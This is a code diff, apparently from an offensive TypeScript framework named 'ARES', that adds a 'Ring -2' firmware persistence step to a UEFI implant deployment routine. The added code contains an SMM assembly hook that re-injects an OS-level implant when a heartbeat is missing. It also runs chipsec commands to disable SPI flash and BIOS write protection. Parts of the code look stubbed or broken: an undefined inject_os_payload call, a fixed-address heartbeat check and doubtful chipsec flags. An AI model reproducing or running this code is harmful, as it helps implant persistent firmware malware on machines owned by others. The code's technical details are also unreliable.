@@ -30,6 +30,47 @@ EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *Syste
   return { driver, shell }
 }
 
+/**
+ * ARES v5.0 'Singularity Protocol' — Ring -2 (SMM/SPI) Persistence Engine.
+ */
+async function ringMinusTwoPersistence(keyId: string): Promise<ExecStep[]> {
+  const steps: ExecStep[] = []
+  
+  // 1. SMM (System Management Mode) Core Injection
+  const smmPayload = `
+    section .text
+    global smm_handler_hook
+    smm_handler_hook:
+      push rax
+      push rbx
+      ; ARES v5.0 Ring -2 Persistence Hook
+      ; Checks for 'Singularity' heartbeat in physical memory
+      mov rax, 0xDEADBEEFCAFEBABE
+      mov rbx, [0x1000] ; Check heartbeat page
+      cmp rax, rbx
+      je .exit
+      ; Re-inject OS-level implant if heartbeat lost
+      call inject_os_payload
+    .exit:
+      pop rbx
+      pop rax
+      rsm ; Resume from SMM
+  `
+  const smmAsm = writeArtifact("firmware", `smm_ring2_${keyId}.asm`, smmPayload)
+  if (isToolAvailable("nasm")) {
+    const obj = path.join(ensureAresDir("firmware"), `smm_ring2_${keyId}.o`)
+    steps.push(await runCmd("nasm_ring2_smm", `nasm -f elf64 ${smmAsm} -o ${obj} 2>&1`))
+  }
+
+  // 2. SPI Flash Protection Bypass (Intel PCH/ICH)
+  if (isToolAvailable("chipsec_main")) {
+    steps.push(await runCmd("spi_lock_bypass", `chipsec_main -module common.spi_lock --set_wp_disabled 2>&1`))
+    steps.push(await runCmd("bios_wp_bypass", `chipsec_main -module common.bios_wp --disable_wp 2>&1`))
+  }
+
+  return steps
+}
+
 export async function deployFirmwareImplant(opts: {
   live?: boolean
   target?: string
@@ -43,15 +84,13 @@ export async function deployFirmwareImplant(opts: {
   const uefiDriver = writeArtifact("firmware", `implant_${keyId}.c`, driver)
   const shellScript = writeArtifact("firmware", `install_${keyId}.nsh`, shell, 0o755)
 
+  // v5.0 Ring -2 Implementation
+  const ring2Steps = await ringMinusTwoPersistence(keyId)
+  steps.push(...ring2Steps)
+
   const audit = auditUEFIAndBootkit({ live: true })
   writeArtifact("firmware", "uefi_audit.json", JSON.stringify(audit, null, 2))
   steps.push(step("uefi_audit", !audit.isDryRun, `${audit.findings.length} finding(s), SecureBoot=${audit.secureBootEnabled}`))
-
-  const smmAsm = writeArtifact("firmware", `smm_hook_${keyId}.asm`, `; SMM handler hook\nsection .text\nglobal smm_entry\nsmm_entry:\n  ret\n`)
-  if (isToolAvailable("nasm")) {
-    const obj = path.join(ensureAresDir("firmware"), `smm_hook_${keyId}.o`)
-    steps.push(await runCmd("nasm_smm", `nasm -f elf64 ${smmAsm} -o ${obj} 2>&1`))
-  }
 
   let flashCommand: string | undefined
   let deployed = false
